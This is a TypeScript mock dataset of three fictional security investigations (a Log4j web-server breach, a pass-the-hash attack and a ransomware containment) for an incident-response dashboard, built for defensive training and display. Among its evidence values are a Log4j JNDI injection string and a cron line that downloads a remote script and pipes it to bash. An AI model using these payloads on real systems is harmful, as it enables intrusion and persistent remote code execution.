import type { Investigation } from '../../types';

// ─── Helpers ──────────────────────────────────────────────────────────────────

function minsAgo(minutes: number): string {
  return new Date(Date.now() - minutes * 60 * 1000).toISOString();
}

function hoursAgo(hours: number): string {
  return minsAgo(hours * 60);
}

// ─── Mock Investigations Dataset ──────────────────────────────────────────────

export const INVESTIGATIONS_MOCK_DATA: Investigation[] = [
  {
    id: 'INV-2026-001',
    title: 'Web Application Compromise & Lateral Movement on Core DMZ',
    status: 'in_progress',
    severity: 'critical',
    assignee: 'Alex Carter',
    leadAnalystRole: 'Senior Incident Responder',
    targetAsset: 'web-srv-01.lab.internal (192.168.1.10)',
    relatedAlerts: ['ALT-001', 'ALT-002', 'ALT-004', 'ALT-007'],
    createdAt: hoursAgo(6),
    updatedAt: minsAgo(18),
    summary:
      'Multi-stage intrusion targeting DMZ web server web-srv-01. Attacker exploited an unauthenticated remote code execution vulnerability (Log4j CVE-2021-44228), escalated privileges via misconfigured sudo permissions to root, established persistence via cron, and initiated HTTP beaconing to an external C2 node.',

    // ── Incident Event Timeline ───────────────────────────────────────────────
    timeline: [
      {
        id: 'TL-101',
        timestamp: hoursAgo(5.8),
        phase: 'Initial Reconnaissance',
        title: 'Port Scan & Service Discovery on DMZ',
        description:
          'External actor probed open HTTP/HTTPS and management ports on 192.168.1.10 using fast SYN sweep.',
        severity: 'medium',
        sensor: 'Suricata NIDS (VLAN 50 Tap)',
        mitreTactic: 'Reconnaissance',
        mitreTechnique: 'T1046 – Network Service Discovery',
      },
      {
        id: 'TL-102',
        timestamp: hoursAgo(4.9),
        phase: 'Exploitation & Initial Access',
        title: 'Log4j JNDI Lookup Injected via HTTP User-Agent',
        description:
          'Inbound HTTP POST containing ${jndi:ldap://203.0.113.42:1389/Exploit} reached web-srv-01, triggering remote class load.',
        severity: 'critical',
        sensor: 'ModSecurity WAF & Suricata Rule 2034321',
        mitreTactic: 'Initial Access',
        mitreTechnique: 'T1190 – Exploit Public-Facing Application',
      },
      {
        id: 'TL-103',
        timestamp: hoursAgo(4.2),
        phase: 'Privilege Escalation',
        title: 'Interactive Root Shell via Sudo Misconfiguration',
        description:
          'Compromised service account "www-data" executed sudo /bin/bash without password requirement, elevating to root (UID 0).',
        severity: 'critical',
        sensor: 'Linux Auditd (Rule: sudo_exec) + Wazuh HIDS',
        mitreTactic: 'Privilege Escalation',
        mitreTechnique: 'T1548.003 – Sudo Caching & NOPASSWD',
      },
      {
        id: 'TL-104',
        timestamp: hoursAgo(3.4),
        phase: 'Defense Evasion & Persistence',
        title: 'Unauthorized Crontab Script Scheduled',
        description:
          'Attacker appended entry to crontab: "*/5 * * * * curl http://192.168.1.200/c.sh | bash" to maintain persistent access.',
        severity: 'high',
        sensor: 'Wazuh File Integrity Monitor (syscheck)',
        mitreTactic: 'Persistence',
        mitreTechnique: 'T1053.003 – Cron Persistence',
      },
      {
        id: 'TL-105',
        timestamp: hoursAgo(2.1),
        phase: 'Command & Control',
        title: 'Periodic Outbound C2 Beaconing Established',
        description:
          'Rogue background process initiated HTTP beacons every 60 seconds to c2panel.darkweb-test.io (203.0.113.99).',
        severity: 'high',
        sensor: 'Suricata NIDS Flow Engine (Alert SID 2024101)',
        mitreTactic: 'Command & Control',
        mitreTechnique: 'T1071.001 – Web Protocols: HTTP C2',
      },
      {
        id: 'TL-106',
        timestamp: minsAgo(45),
        phase: 'Exfiltration & Lateral Spread',
        title: 'High-Volume Outbound SFTP Data Transfer',
        description:
          '4.2 GB transferred from internal database cluster to external host 198.51.100.89 outside business operational hours.',
        severity: 'critical',
        sensor: 'Zeek / Suricata NetFlow Meter',
        mitreTactic: 'Exfiltration',
        mitreTechnique: 'T1041 – Exfiltration Over C2 Channel',
      },
    ],

    // ── Evidence Review ───────────────────────────────────────────────────────
    evidence: [
      {
        id: 'EVD-01',
        type: 'network',
        title: 'C2 Beacon Network Flow Trace',
        details: {
          'Source IP': '192.168.1.10:49152',
          'Destination IP': '203.0.113.99:80',
          'Domain Name': 'c2panel.darkweb-test.io',
          'Protocol / Port': 'TCP / 80 (HTTP)',
          'Beacon Interval': '60s (Zero Jitter)',
          'Total Bytes Transferred': '14.8 MB across 180 sessions',
        },
        rawSnippet:
          '10/30-02:15:00.123456 [**] [1:2024101:2] ET MALWARE Cobalt Strike HTTP Beacon [**] [Priority: 1] {TCP} 192.168.1.10:49152 -> 203.0.113.99:80',
      },
      {
        id: 'EVD-02',
        type: 'endpoint',
        title: 'Privilege Escalation Auditd Execution Record',
        details: {
          'Parent Process': 'apache2 (PID 1420)',
          'Spawned Process': '/bin/bash (PID 3912)',
          'User (UID)': '33 (www-data)',
          'Effective User (EUID)': '0 (root)',
          'Command Line': 'sudo -u root /bin/bash',
          'Session Duration': '4m 12s active shell',
        },
        rawSnippet:
          'type=EXECVE msg=audit(1761786840.412:912): argc=3 a0="sudo" a1="-u" a2="root" a3="/bin/bash" pid=3912 uid=33 auid=1000 ses=2 comm="sudo"',
      },
      {
        id: 'EVD-03',
        type: 'file',
        title: 'Staged Shell Payload & Crontab Persistence Script',
        details: {
          'File Path': '/var/spool/cron/crontabs/deploy',
          'Staged Script': '/tmp/.c_cache/c.sh',
          'SHA-256 Hash': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
          'File Permissions': '0755 (-rwxr-xr-x)',
          'Crontab Schedule': '*/5 * * * * (Every 5 minutes)',
        },
        rawSnippet:
          '*/5 * * * * curl -s http://192.168.1.200/c.sh | /bin/bash > /dev/null 2>&1',
      },
      {
        id: 'EVD-04',
        type: 'auth',
        title: 'SSH & PAM Authentication Telemetry',
        details: {
          'Service Target': 'sshd & pam_unix(sudo:session)',
          'Compromised Identity': 'www-data ➔ root',
          'Logon Type': 'Local Interactive Privilege Switch',
          'IP Origin': '203.0.113.42 (Associated with 47 failed attempts in ALT-001)',
        },
        rawSnippet:
          'pam_unix(sudo:session): session opened for user root by www-data(uid=33)',
      },
    ],

    // ── Associated Assessment ─────────────────────────────────────────────────
    associatedAssessment: {
      scanId: 'SCN-002',
      scanName: 'Production Web App Deep Audit',
      target: 'http://web-srv-01:8080',
      scannerEngine: 'OWASP ZAP 2.14 / Nuclei v3.2',
      findingsCount: 4,
      criticalCves: ['CVE-2021-44228 (Log4j)', 'CVE-2023-38606 (SQLi)'],
      correlationNotes:
        'Red Team scan SCN-002 identified high-severity remote code execution in the Apache/Java stack. The vulnerability in log4j-core 2.14.1 was flagged during reconnaissance 3 hours prior to actual breach execution.',
    },

    // ── AI Incident Summary ───────────────────────────────────────────────────
    aiSummary: {
      executiveSummary:
        'High-confidence confirmation of a multi-stage intrusion against DMZ web host web-srv-01. Initial entry succeeded via unauthenticated JNDI injection (CVE-2021-44228), followed by root escalation via a local sudoers wildcard entry. Outbound C2 communications and anomalous database data flow indicate the host is actively compromised.',
      rootCause:
        'Unpatched Java logging component in customer portal combined with an overly permissive /etc/sudoers rule granting www-data NOPASSWD root execution.',
      impactAssessment:
        'Confidentiality and integrity severely impacted. Database read-access compromised; attacker holds root privileges on web-srv-01 with potential lateral pivot into VLAN 10 and VLAN 50.',
      confidenceScore: 94,
      keyRiskIndicators: [
        'Active C2 channel transmitting beacons every 60 seconds.',
        'Crontab persistence will respawn shell upon process kill.',
        'Possible exfiltration of 4.2 GB database records.',
        'EUID 0 privilege allows credential dumping from memory.',
      ],
      generatedAt: minsAgo(15),
    },

    // ── Response Playbooks ────────────────────────────────────────────────────
    playbookActions: [
      {
        id: 'ACT-01',
        phase: 'containment',
        title: 'Isolate Host to Quarantine VLAN',
        description:
          'Migrate web-srv-01 virtual network interface to isolated VLAN 999 to sever C2 beaconing while preserving memory state for forensic capture.',
        targetAsset: 'web-srv-01 (192.168.1.10)',
        commandSnippet: 'virsh domif-setlink web-srv-01 vnet0 down # Or apply iptables isolation drop',
        simulatedStatus: 'applied',
        appliedAt: minsAgo(22),
      },
      {
        id: 'ACT-02',
        phase: 'containment',
        title: 'Block Attacker C2 IP on Perimeter Firewall',
        description:
          'Inject drop rules on edge router to block all inbound and outbound traffic to 203.0.113.99 and 198.51.100.89.',
        targetAsset: 'Perimeter Gateway (192.168.1.1)',
        commandSnippet: 'iptables -I FORWARD -d 203.0.113.99 -j DROP && iptables -I FORWARD -s 203.0.113.99 -j DROP',
        simulatedStatus: 'applied',
        appliedAt: minsAgo(18),
      },
      {
        id: 'ACT-03',
        phase: 'eradication',
        title: 'Terminate Rogue Bash Process & Inactive Web Shells',
        description:
          'Kill PID 3912 and purge staged temporary scripts located in /tmp/.c_cache/ and /var/spool/cron/crontabs/deploy.',
        targetAsset: 'web-srv-01 (192.168.1.10)',
        commandSnippet: 'kill -9 3912 && rm -rf /tmp/.c_cache && crontab -u deploy -r',
        simulatedStatus: 'pending',
      },
      {
        id: 'ACT-04',
        phase: 'eradication',
        title: 'Revoke and Reset Compromised Service Credentials',
        description:
          'Rotate database service passwords in db-srv-01 and revoke active session JWT signing keys.',
        targetAsset: 'db-srv-01 & api-gw-01',
        commandSnippet: 'openssl rand -hex 32 > /etc/jwt/secret.key && systemctl restart api-gateway',
        simulatedStatus: 'pending',
      },
      {
        id: 'ACT-05',
        phase: 'recovery',
        title: 'Patch Log4j to Version 2.17.1 & Restrict Sudoers',
        description:
          'Deploy updated log4j package and remove NOPASSWD line from /etc/sudoers.d/web-portal.',
        targetAsset: 'web-srv-01 (192.168.1.10)',
        commandSnippet: 'apt-get install --only-upgrade liblog4j2-java && sed -i "/www-data/d" /etc/sudoers',
        simulatedStatus: 'pending',
      },
      {
        id: 'ACT-06',
        phase: 'verification',
        title: 'Trigger Automated Red Team Verification Scan',
        description:
          'Dispatch scan SCN-002 against patched endpoint to confirm vulnerability closure and verify zero open exploit pathways.',
        targetAsset: 'http://web-srv-01:8080',
        commandSnippet: 'nuclei -u http://web-srv-01:8080 -tags cve-2021-44228',
        simulatedStatus: 'pending',
      },
    ],
  },
  {
    id: 'INV-2026-002',
    title: 'Pass-the-Hash & Active Directory Replication Probe',
    status: 'open',
    severity: 'high',
    assignee: 'Jordan Vance',
    leadAnalystRole: 'Threat Intelligence Specialist',
    targetAsset: 'dc-01.lab.local (192.168.1.5)',
    relatedAlerts: ['ALT-004', 'ALT-014'],
    createdAt: hoursAgo(12),
    updatedAt: hoursAgo(1.2),
    summary:
      'Observation of repeated NTLM authentication using extracted Domain Administrator hashes originating from workstation wkstn-14 targeting the primary Domain Controller. Activity correlates with findings from Red Team assessment SCN-007.',
    timeline: [
      {
        id: 'TL-201',
        timestamp: hoursAgo(11.5),
        phase: 'Initial Access / Compromise',
        title: 'Endpoint Workstation Compromise',
        description: 'Workstation wkstn-14 infected via unapproved software package.',
        severity: 'high',
        sensor: 'Sysmon Event ID 1',
        mitreTactic: 'Execution',
        mitreTechnique: 'T1204 – User Execution',
      },
      {
        id: 'TL-202',
        timestamp: hoursAgo(8.2),
        phase: 'Credential Dumping',
        title: 'LSASS Memory Injection Detected',
        description: 'Mimikatz-style memory read observed against lsass.exe.',
        severity: 'critical',
        sensor: 'Wazuh EDR (Rule 5702)',
        mitreTactic: 'Credential Access',
        mitreTechnique: 'T1003.001 – OS Credential Dumping',
      },
      {
        id: 'TL-203',
        timestamp: hoursAgo(2.1),
        phase: 'Lateral Movement',
        title: 'Pass-the-Hash Logon Event against dc-01',
        description: 'Domain Administrator hash authenticated without Kerberos ticket.',
        severity: 'critical',
        sensor: 'Active Directory Security Log (Event 4624)',
        mitreTactic: 'Lateral Movement',
        mitreTechnique: 'T1550.002 – Pass the Hash',
      },
    ],
    evidence: [
      {
        id: 'EVD-201',
        type: 'auth',
        title: 'Domain Controller Event ID 4624 Logon Record',
        details: {
          'Logon Type': '3 (Network Logon)',
          'Security ID': 'S-1-5-21-LAB-500 (Administrator)',
          'Workstation Name': 'WKSTN-14',
          'Source IP': '192.168.1.88',
          'Auth Package': 'NTLM V1',
        },
        rawSnippet:
          'Logon Type: 3. Authentication Package: NTLM. Workstation Name: WKSTN-14. Source Network Address: 192.168.1.88.',
      },
    ],
    associatedAssessment: {
      scanId: 'SCN-007',
      scanName: 'Active Directory Domain Controller Audit',
      target: 'dc-01.lab.local (192.168.1.5)',
      scannerEngine: 'BloodHound / PingCastle / CME',
      findingsCount: 3,
      criticalCves: ['CVE-2021-34527 (PrintNightmare)'],
      correlationNotes:
        'Red Team audit documented Kerberoastable SPN accounts and missing SMB signing on Domain Controller.',
    },
    aiSummary: {
      executiveSummary:
        'Pass-the-hash intrusion detected from compromised student endpoint wkstn-14 toward primary domain controller dc-01. Compromised administrator credentials represent immediate risk to entire forest.',
      rootCause: 'Cached NTLM credentials on unmanaged client workstation without Credential Guard enabled.',
      impactAssessment: 'Entire directory forest potentially exposed to rogue Kerberos ticket forgery (Golden Ticket).',
      confidenceScore: 89,
      keyRiskIndicators: [
        'NTLMv1 protocol still accepted on domain controllers.',
        'High-privilege admin account active on multiple endpoints.',
      ],
      generatedAt: hoursAgo(1),
    },
    playbookActions: [
      {
        id: 'ACT-201',
        phase: 'containment',
        title: 'Reset KRBTGT Account Password Twice',
        description: 'Invalidate all existing Golden Tickets and Kerberos session keys.',
        targetAsset: 'dc-01.lab.local',
        simulatedStatus: 'pending',
      },
      {
        id: 'ACT-202',
        phase: 'containment',
        title: 'Isolate Workstation wkstn-14',
        description: 'Disconnect wkstn-14 from corporate VLAN and trigger volatile memory dump.',
        targetAsset: 'wkstn-14 (192.168.1.88)',
        simulatedStatus: 'pending',
      },
      {
        id: 'ACT-203',
        phase: 'recovery',
        title: 'Enforce SMB Signing & Disable NTLMv1 via GPO',
        description: 'Require Kerberos and SMBv3 packet signing on all domain servers.',
        targetAsset: 'Domain Policy',
        simulatedStatus: 'pending',
      },
    ],
  },
  {
    id: 'INV-2026-003',
    title: 'Ransomware Behavioral Encryption Attempt on Finance Host',
    status: 'resolved',
    severity: 'critical',
    assignee: 'Elena Rostova',
    leadAnalystRole: 'Forensic Investigator',
    targetAsset: 'wkstn-09.lab.internal (192.168.1.74)',
    relatedAlerts: ['ALT-003'],
    createdAt: hoursAgo(24),
    updatedAt: hoursAgo(4),
    summary:
      'Rapid mass file rename and encryption behavioral heuristic triggered on wkstn-09. The offending process svchost32.exe was immediately terminated by automated EDR rule and the host was quarantined.',
    timeline: [
      {
        id: 'TL-301',
        timestamp: hoursAgo(23.8),
        phase: 'Malware Execution',
        title: 'Rogue Process svchost32.exe Spawned',
        description: 'Process initiated from C:\\Users\\Public without digital signature.',
        severity: 'critical',
        sensor: 'Windows Sysmon Event 1',
        mitreTactic: 'Execution',
        mitreTechnique: 'T1059 – Command Line Execution',
      },
      {
        id: 'TL-302',
        timestamp: hoursAgo(23.6),
        phase: 'Impact / Encryption',
        title: 'Mass File Modification Detected',
        description: '2,400 user document extensions altered to .locked within 180 seconds.',
        severity: 'critical',
        sensor: 'Wazuh HIDS FIM & EDR',
        mitreTactic: 'Impact',
        mitreTechnique: 'T1486 – Data Encrypted for Impact',
      },
      {
        id: 'TL-303',
        timestamp: hoursAgo(23.2),
        phase: 'Containment Action',
        title: 'Host Isolated & Process Killed by Analyst',
        description: 'VLAN quarantine engaged and volume shadow copy restoration initiated.',
        severity: 'info',
        sensor: 'Blue Team Containment Automation',
        mitreTactic: 'Containment',
        mitreTechnique: 'Remediation',
      },
    ],
    evidence: [
      {
        id: 'EVD-301',
        type: 'file',
        title: 'Malware Executable Binary Artifact',
        details: {
          'File Path': 'C:\\Users\\Public\\svchost32.exe',
          'File Size': '842 KB',
          'SHA-256': '4f3b7c91e80a52d2f31b8c8d0a3e91f1b2c4d6e8a0f2b4c6d8e0a2b4c6d8e0a2',
          'ImpHash': 'd41d8cd98f00b204e9800998ecf8427e',
        },
        rawSnippet:
          'Binary sample retained in /opt/cyberdefense/quarantine/samples/svchost32.exe.bin',
      },
    ],
    associatedAssessment: {
      scanId: 'SCN-010',
      scanName: 'Docker Host & Registry Exposure Audit',
      target: '192.168.10.15',
      scannerEngine: 'Trivy v0.49 / Docker-Bench',
      findingsCount: 2,
      criticalCves: ['CVE-2019-5736 (Docker API)'],
      correlationNotes:
        'Investigation revealed payload was originally retrieved through an unsecured internal docker staging image.',
    },
    aiSummary: {
      executiveSummary:
        'Ransomware outbreak successfully thwarted on finance workstation wkstn-09. File encryption was contained after 3 minutes. Zero ransom communications occurred and offline backups verified intact.',
      rootCause: 'Phishing payload staged via internal development container repository.',
      impactAssessment: 'Limited to single workstation. 2,400 files recovered from Volume Shadow Copies.',
      confidenceScore: 98,
      keyRiskIndicators: [
        'Endpoint isolation was effective.',
        'No lateral propagation detected on finance VLAN.',
      ],
      generatedAt: hoursAgo(5),
    },
    playbookActions: [
      {
        id: 'ACT-301',
        phase: 'containment',
        title: 'Isolate Host from Local Subnet',
        description: 'Network quarantine triggered via software defined perimeter.',
        targetAsset: 'wkstn-09',
        simulatedStatus: 'applied',
        appliedAt: hoursAgo(23.5),
      },
      {
        id: 'ACT-302',
        phase: 'recovery',
        title: 'Restore Files from Clean Shadow Copy Snapshot',
        description: 'Automated rollback of user documents from VSS.',
        targetAsset: 'wkstn-09',
        simulatedStatus: 'applied',
        appliedAt: hoursAgo(20),
      },
    ],
  },
];
